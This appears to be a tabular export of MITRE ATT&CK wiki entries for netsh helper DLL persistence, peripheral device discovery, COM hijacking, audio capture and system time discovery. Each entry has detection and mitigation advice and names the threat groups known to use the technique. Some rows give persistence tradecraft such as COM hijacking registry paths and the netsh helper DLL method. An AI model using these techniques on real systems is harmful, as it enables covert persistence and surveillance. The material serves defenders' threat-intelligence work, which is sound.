667,['It is likely unusual for netsh.exe to have any child processes in most environments. Monitor process executions and investigate any child processes spawned by netsh.exe for malicious behavior. Monitor the <code>HKLM\\SOFTWARE\\Microsoft\\Netsh</code> registry key for any new or suspicious entries that do not correlate with known system files or benign software.[[CiteRef::Demaske Netsh Persistence]]'],[],[],"['Matthew Demaske, Adaptforward']","['Process monitoring', 'DLL monitoring', 'Windows Registry']",['[[Software/S0108|netsh]] can be used as a persistence proxy technique to execute a helper DLL when netsh.exe is executed.[[CiteRef::Demaske Netsh Persistence]]'],['Carbanak'],"['Carbanak', 'Anunak']",['G0008'],['Identify and block potentially malicious software that may persist in this manner by using whitelisting[[CiteRef::Beechey 2010]] tools capable of monitoring DLL loads by Windows utilities like AppLocker.[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",['[[Software/S0108|netsh]]'],"Software: netsh, netsh.exe",['Persistence'],['Technique/T1128'],['Netsh Helper DLL'],https://attack.mitre.org/wiki/Technique/T1128
668,['It is likely unusual for netsh.exe to have any child processes in most environments. Monitor process executions and investigate any child processes spawned by netsh.exe for malicious behavior. Monitor the <code>HKLM\\SOFTWARE\\Microsoft\\Netsh</code> registry key for any new or suspicious entries that do not correlate with known system files or benign software.[[CiteRef::Demaske Netsh Persistence]]'],[],[],"['Matthew Demaske, Adaptforward']","['Process monitoring', 'DLL monitoring', 'Windows Registry']",['[[Software/S0108|netsh]] can be used as a persistence proxy technique to execute a helper DLL when netsh.exe is executed.[[CiteRef::Demaske Netsh Persistence]]'],['Naikon'],['Naikon'],['G0019'],['Identify and block potentially malicious software that may persist in this manner by using whitelisting[[CiteRef::Beechey 2010]] tools capable of monitoring DLL loads by Windows utilities like AppLocker.[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",['[[Software/S0108|netsh]]'],"Software: netsh, netsh.exe",['Persistence'],['Technique/T1128'],['Netsh Helper DLL'],https://attack.mitre.org/wiki/Technique/T1128
669,['It is likely unusual for netsh.exe to have any child processes in most environments. Monitor process executions and investigate any child processes spawned by netsh.exe for malicious behavior. Monitor the <code>HKLM\\SOFTWARE\\Microsoft\\Netsh</code> registry key for any new or suspicious entries that do not correlate with known system files or benign software.[[CiteRef::Demaske Netsh Persistence]]'],[],[],"['Matthew Demaske, Adaptforward']","['Process monitoring', 'DLL monitoring', 'Windows Registry']",['[[Software/S0108|netsh]] can be used as a persistence proxy technique to execute a helper DLL when netsh.exe is executed.[[CiteRef::Demaske Netsh Persistence]]'],['Lazarus Group'],"['Lazarus Group', 'HIDDEN COBRA', 'Guardians of Peace']",['G0032'],['Identify and block potentially malicious software that may persist in this manner by using whitelisting[[CiteRef::Beechey 2010]] tools capable of monitoring DLL loads by Windows utilities like AppLocker.[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",['[[Software/S0108|netsh]]'],"Software: netsh, netsh.exe",['Persistence'],['Technique/T1128'],['Netsh Helper DLL'],https://attack.mitre.org/wiki/Technique/T1128
670,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],[],['[[Group/G0047|Gamaredon Group]] tools contained an application to check performance of USB flash drives.[[CiteRef::Palo Alto Gamaredon Feb 2017]]'],['Gamaredon Group'],['Gamaredon Group'],['G0047'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about peripheral devices, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],[],['Discovery'],['Technique/T1120'],['Peripheral Device Discovery'],https://attack.mitre.org/wiki/Technique/T1120
671,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],[],"['[[Software/S0128|BADNEWS]] checks for new hard drives on the victim, such as USB devices, by listening for the WM_DEVICECHANGE window message.[[CiteRef::Forcepoint Monsoon]]']",['MONSOON'],"['MONSOON', 'Operation Hangover']",['G0042'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about peripheral devices, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],Software: BADNEWS,['Discovery'],['Technique/T1120'],['Peripheral Device Discovery'],https://attack.mitre.org/wiki/Technique/T1120
672,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],[],['[[Software/S0045|ADVSTORESHELL]] can list connected devices.[[CiteRef::ESET Sednit Part 2]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about peripheral devices, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],"Software: ADVSTORESHELL, NETUI, ...",['Discovery'],['Technique/T1120'],['Peripheral Device Discovery'],https://attack.mitre.org/wiki/Technique/T1120
673,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],[],"['[[Software/S0136|USBStealer]] monitors victims for insertion of removable drives. When dropped onto a second victim, it also enumerates drives connected to the system.[[CiteRef::ESET Sednit USBStealer 2014]]']",['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about peripheral devices, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],"Software: USBStealer, USB Stealer, Win32/USBStealer",['Discovery'],['Technique/T1120'],['Peripheral Device Discovery'],https://attack.mitre.org/wiki/Technique/T1120
674,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],[],['[[Software/S0161|XAgentOSX]] contains the showBackupIosFolder function to check for IOS device backups by running <code>ls -la ~/Library/Application\\ Support/MobileSync/Backup/</code>.[[CiteRef::XAgentOSX]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about peripheral devices, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],Software: XAgentOSX,['Discovery'],['Technique/T1120'],['Peripheral Device Discovery'],https://attack.mitre.org/wiki/Technique/T1120
675,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],[],['[[Group/G0007|APT28]] uses a module to receive a notification every time a USB mass storage device is inserted into a victim.[[CiteRef::Microsoft SIR Vol 19]] They have also looked for the presence of iOS devices by looking for their backups [[CiteRef::XAgentOSX]].'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about peripheral devices, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],[],['Discovery'],['Technique/T1120'],['Peripheral Device Discovery'],https://attack.mitre.org/wiki/Technique/T1120
676,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],[],['[[Software/S0148|RTM]] can obtain a list of smart card readers attached to the victim.[[CiteRef::ESET RTM Feb 2017]]'],['RTM'],['RTM'],['G0048'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about peripheral devices, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],Software: RTM,['Discovery'],['Technique/T1120'],['Peripheral Device Discovery'],https://attack.mitre.org/wiki/Technique/T1120
677,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],[],"['[[Software/S0089|BlackEnergy]] can gather very specific information about attached USB devices, to include device instance ID and drive geometry.[[CiteRef::Securelist BlackEnergy Nov 2014]]']",['Sandworm Team'],"['Sandworm Team', 'Quedagh']",['G0034'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about peripheral devices, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],"Software: BlackEnergy, Black Energy",['Discovery'],['Technique/T1120'],['Peripheral Device Discovery'],https://attack.mitre.org/wiki/Technique/T1120
678,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],[],['[[Group/G0020|Equation]] contains functionality to search for specific information about the attached hard drive that could be used to identify and overwrite the firmware.[[CiteRef::Kaspersky Equation QA]]'],['Equation'],['Equation'],['G0020'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about peripheral devices, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],[],['Discovery'],['Technique/T1120'],['Peripheral Device Discovery'],https://attack.mitre.org/wiki/Technique/T1120
679,"['There are opportunities to detect COM hijacking by searching for Registry references that have been replaced and through Registry operations replacing know binary paths with unknown paths. Even though some third party applications define user COM objects, the presence of objects within <code>HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\</code> may be anomalous and should be investigated since user objects will be loaded prior to machine objects in <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\</code>.[[CiteRef::Endgame COM Hijacking]] Registry entries for existing COM objects may change infrequently. When an entry with a known good path and binary is replaced or changed to an unusual value to point to an unknown binary in a new location, then it may indicate suspicious behavior and should be investigated. Likewise, if software DLL loads are collected and analyzed, any unusual DLL load that can be correlated with a COM object Registry modification may indicate COM hijacking has been performed.']",['Autoruns Analysis'],[],['ENDGAME'],"['Windows Registry', 'DLL monitoring', 'Loaded DLLs']",['[[Software/S0044|JHUHUGIT]] has used COM hijacking to establish persistence by hijacking a class named MMDeviceEnumerator and also by registering the payload as a Shell Icon Overlay handler COM object ({3543619C-D563-43f7-95EA-4DA7E1CC396A}).[[CiteRef::ESET Sednit Part 1]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Direct mitigation of this technique may not be recommended for a particular environment since COM objects are a legitimate part of the operating system and installed software. Blocking COM object changes may have unforeseen side effects to legitimate functionality.\n\nInstead, identify and block potentially malicious software that may execute, or be executed by, this technique using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],[],"Software: JHUHUGIT, Seduploader, ...","['Defense Evasion', 'Persistence']",['Technique/T1122'],['Component Object Model Hijacking'],https://attack.mitre.org/wiki/Technique/T1122
680,"['There are opportunities to detect COM hijacking by searching for Registry references that have been replaced and through Registry operations replacing know binary paths with unknown paths. Even though some third party applications define user COM objects, the presence of objects within <code>HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\</code> may be anomalous and should be investigated since user objects will be loaded prior to machine objects in <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\</code>.[[CiteRef::Endgame COM Hijacking]] Registry entries for existing COM objects may change infrequently. When an entry with a known good path and binary is replaced or changed to an unusual value to point to an unknown binary in a new location, then it may indicate suspicious behavior and should be investigated. Likewise, if software DLL loads are collected and analyzed, any unusual DLL load that can be correlated with a COM object Registry modification may indicate COM hijacking has been performed.']",['Autoruns Analysis'],[],['ENDGAME'],"['Windows Registry', 'DLL monitoring', 'Loaded DLLs']",['Some variants of [[Software/S0045|ADVSTORESHELL]] achieve persistence by registering the payload as a Shell Icon Overlay handler COM object.[[CiteRef::ESET Sednit Part 2]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Direct mitigation of this technique may not be recommended for a particular environment since COM objects are a legitimate part of the operating system and installed software. Blocking COM object changes may have unforeseen side effects to legitimate functionality.\n\nInstead, identify and block potentially malicious software that may execute, or be executed by, this technique using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],[],"Software: ADVSTORESHELL, NETUI, ...","['Defense Evasion', 'Persistence']",['Technique/T1122'],['Component Object Model Hijacking'],https://attack.mitre.org/wiki/Technique/T1122
681,"['There are opportunities to detect COM hijacking by searching for Registry references that have been replaced and through Registry operations replacing know binary paths with unknown paths. Even though some third party applications define user COM objects, the presence of objects within <code>HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\</code> may be anomalous and should be investigated since user objects will be loaded prior to machine objects in <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\</code>.[[CiteRef::Endgame COM Hijacking]] Registry entries for existing COM objects may change infrequently. When an entry with a known good path and binary is replaced or changed to an unusual value to point to an unknown binary in a new location, then it may indicate suspicious behavior and should be investigated. Likewise, if software DLL loads are collected and analyzed, any unusual DLL load that can be correlated with a COM object Registry modification may indicate COM hijacking has been performed.']",['Autoruns Analysis'],[],['ENDGAME'],"['Windows Registry', 'DLL monitoring', 'Loaded DLLs']",['[[Group/G0007|APT28]] has used COM hijacking for persistence by replacing the legitimate <code>MMDeviceEnumerator</code> object with a payload.[[CiteRef::ESET Sednit Part 1]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Direct mitigation of this technique may not be recommended for a particular environment since COM objects are a legitimate part of the operating system and installed software. Blocking COM object changes may have unforeseen side effects to legitimate functionality.\n\nInstead, identify and block potentially malicious software that may execute, or be executed by, this technique using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],[],[],"['Defense Evasion', 'Persistence']",['Technique/T1122'],['Component Object Model Hijacking'],https://attack.mitre.org/wiki/Technique/T1122
682,"['There are opportunities to detect COM hijacking by searching for Registry references that have been replaced and through Registry operations replacing know binary paths with unknown paths. Even though some third party applications define user COM objects, the presence of objects within <code>HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\</code> may be anomalous and should be investigated since user objects will be loaded prior to machine objects in <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\</code>.[[CiteRef::Endgame COM Hijacking]] Registry entries for existing COM objects may change infrequently. When an entry with a known good path and binary is replaced or changed to an unusual value to point to an unknown binary in a new location, then it may indicate suspicious behavior and should be investigated. Likewise, if software DLL loads are collected and analyzed, any unusual DLL load that can be correlated with a COM object Registry modification may indicate COM hijacking has been performed.']",['Autoruns Analysis'],[],['ENDGAME'],"['Windows Registry', 'DLL monitoring', 'Loaded DLLs']",['[[Software/S0126|ComRAT]] samples have been seen which hijack COM objects for persistence by replacing the path to shell32.dll in registry location <code>HKCU\\Software\\Classes\\CLSID\\{42aedc87-2188-41fd-b9a3-0c966feabec1}\\InprocServer32</code>.[[CiteRef::NorthSec 2015 GData Uroburos Tools]]'],['Turla'],"['Turla', 'Waterbug']",['G0010'],"['Direct mitigation of this technique may not be recommended for a particular environment since COM objects are a legitimate part of the operating system and installed software. Blocking COM object changes may have unforeseen side effects to legitimate functionality.\n\nInstead, identify and block potentially malicious software that may execute, or be executed by, this technique using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],[],Software: ComRAT,"['Defense Evasion', 'Persistence']",['Technique/T1122'],['Component Object Model Hijacking'],https://attack.mitre.org/wiki/Technique/T1122
683,"['Detection of this technique may be difficult due to the various APIs that may be used. Telemetry data regarding API use may not be useful depending on how a system is normally used, but may provide context to other potentially malicious activity occurring on a system.\n\nBehavior that could indicate technique use include an unknown or unusual process accessing APIs associated with devices or software that interact with the microphone, recording devices, or recording software, and a process periodically writing files to disk that contain audio data.']",[],[],[],"['API monitoring', 'Process monitoring', 'File monitoring']",['[[Software/S0152|EvilGrab]] has the capability to capture audio from a victim machine.[[CiteRef::PWC Cloud Hopper Technical Annex April 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Mitigating this technique specifically may be difficult as it requires fine-grained API control. Efforts should be focused on preventing unwanted or unknown code from executing on a system.\n\nIdentify and block potentially malicious software that may be used to record audio by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10']",['User'],[],Software: EvilGrab,['Collection'],['Technique/T1123'],['Audio Capture'],https://attack.mitre.org/wiki/Technique/T1123
684,['Command-line interface monitoring may be useful to detect instances of net.exe or other command-line utilities being used to gather system time or time zone. Methods of detecting API use for gathering this information are likely less useful due to how often they may be used by legitimate software.'],[],[],[],"['Process monitoring', 'Process command-line parameters', 'API monitoring']",['The <code>net time</code> command can be used in [[Software/S0039|Net]] to determine the local or remote system time.[[CiteRef::TechNet Net Time]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],"['Benign software uses legitimate processes to gather system time. Efforts should be focused on preventing unwanted or unknown code from executing on a system. Some common tools, such as net.exe, may be blocked by policy to prevent common ways of acquiring remote system time.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to acquire system time information, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],[],"Software: Net, net.exe",['Discovery'],['Technique/T1124'],['System Time Discovery'],https://attack.mitre.org/wiki/Technique/T1124
685,['Command-line interface monitoring may be useful to detect instances of net.exe or other command-line utilities being used to gather system time or time zone. Methods of detecting API use for gathering this information are likely less useful due to how often they may be used by legitimate software.'],[],[],[],"['Process monitoring', 'Process command-line parameters', 'API monitoring']",['The <code>net time</code> command can be used in [[Software/S0039|Net]] to determine the local or remote system time.[[CiteRef::TechNet Net Time]]'],['Ke3chang'],['Ke3chang'],['G0004'],"['Benign software uses legitimate processes to gather system time. Efforts should be focused on preventing unwanted or unknown code from executing on a system. Some common tools, such as net.exe, may be blocked by policy to prevent common ways of acquiring remote system time.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to acquire system time information, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],[],"Software: Net, net.exe",['Discovery'],['Technique/T1124'],['System Time Discovery'],https://attack.mitre.org/wiki/Technique/T1124
